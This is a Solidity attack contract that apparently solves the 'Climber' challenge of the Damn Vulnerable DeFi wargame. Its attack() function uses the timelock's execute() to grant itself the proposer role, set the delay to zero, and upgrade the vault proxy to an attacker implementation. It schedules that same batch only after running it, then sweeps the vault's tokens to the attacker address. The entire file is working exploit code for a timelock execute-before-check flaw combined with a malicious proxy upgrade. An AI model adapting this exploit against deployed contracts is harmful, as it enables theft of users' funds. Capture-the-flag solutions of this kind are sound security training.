// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/AccessControl.sol";
import "@openzeppelin/contracts/utils/Address.sol";

import "../climber/ClimberTimelock.sol";
import "./climberVaultAttack.sol";
import "../DamnValuableToken.sol";

contract climberAttack {
    //calldata for schedule/execute
    address[] public targets;
    uint256[] public values;
    bytes[] public dataElements;
    //needed address
    address payable public timelock;
    address public oldVault;
    address public attackVault;

    address public attacker;
    address public token;

    constructor(
        address payable _timelock,
        address _oldVault,
        address _attackVault,
        address _attacker,
        address _token
    ) {
        timelock = _timelock;
        oldVault = _oldVault;
        attackVault = _attackVault;
        attacker = _attacker;
        token = _token;
    }

    function attack() external {
        targets.push(timelock);
        values.push(0);
        dataElements.push(
            abi.encodeWithSignature(
                "grantRole(bytes32,address)",
                keccak256("PROPOSER_ROLE"),
                address(this)
            )
        );

        targets.push(timelock);
        values.push(0);
        dataElements.push(
            abi.encodeWithSignature("updateDelay(uint64)", uint64(0))
        );

        targets.push(oldVault);
        values.push(0);
        dataElements.push(
            abi.encodeWithSignature("upgradeTo(address)", attackVault)
        );

        targets.push(address(this));
        values.push(0);
        dataElements.push(abi.encodeWithSignature("ourSchedule()"));

        ClimberTimelock(timelock).execute(
            targets,
            values,
            dataElements,
            bytes32("")
        );

        climberVaultAttack(oldVault).sweepFunds(token);
        DamnValuableToken(token).transfer(
            attacker,
            DamnValuableToken(token).balanceOf(address(this))
        );
    }

    //only use to get the right calldata to get the right OperationId
    function ourSchedule() public {
        ClimberTimelock(timelock).schedule(
            targets,
            values,
            dataElements,
            bytes32("")
        );
    }
}